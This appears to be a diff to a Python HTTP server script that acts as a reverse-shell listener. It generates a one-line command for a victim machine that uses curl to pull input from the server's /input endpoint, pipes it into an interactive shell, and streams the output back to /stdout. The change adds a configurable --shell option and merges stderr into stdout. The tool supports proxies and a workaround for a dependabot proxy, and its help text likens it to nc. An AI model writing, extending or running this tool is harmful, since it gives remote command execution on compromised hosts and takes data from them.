@@ -157,9 +157,10 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         proxy = ""
         if self.server.args.x:
             proxy = "-x " + self.server.args.x
+        shell = self.server.args.shell or "/usr/bin/env bash -il"
         host = self.headers["Host"]
-        cmd = f"stdbuf -i0 -o0 -e0 curl {proxy} -X POST -sk {schema}://{host}/input"
-        cmd+= f" | bash -il 2> >(curl -sk -T - {schema}://{host}/stderr)"
+        cmd = f"exec stdbuf -i0 -o0 -e0 curl {proxy} -X POST -sk {schema}://{host}/input"
+        cmd+= f" | {shell} 2>&1"
         cmd+= f" | curl -sk -T - {schema}://{host}/stdout"
         cmd+=  "\n"
         # sending back the complex command to be executed
@@ -209,5 +210,6 @@ if __name__ == "__main__":
     parser.add_argument("--listen-port", type=int, default=443, help="port to listen on")
     parser.add_argument("--serve-forever", default=False, action='store_true', help="whether the server should exit after processing a session (just like nc would)")
     parser.add_argument("--dependabot-workaround", action='store_true', default=False, help="transfer-encoding support in the dependabot proxy is broken, it rewraps the raw chunks. This is a workaround.")
+    parser.add_argument("--shell", help="Shell [--shell /bin/sh or --shell '/usr/bin/env zsh -il']")
     parser.add_argument("-x", help="Proxy to use [e.g. -x socks5h://1.2.3.4:1080 or -x http://user:pwd@1.2.3.4:3128]")
     do_the_job(parser.parse_args())
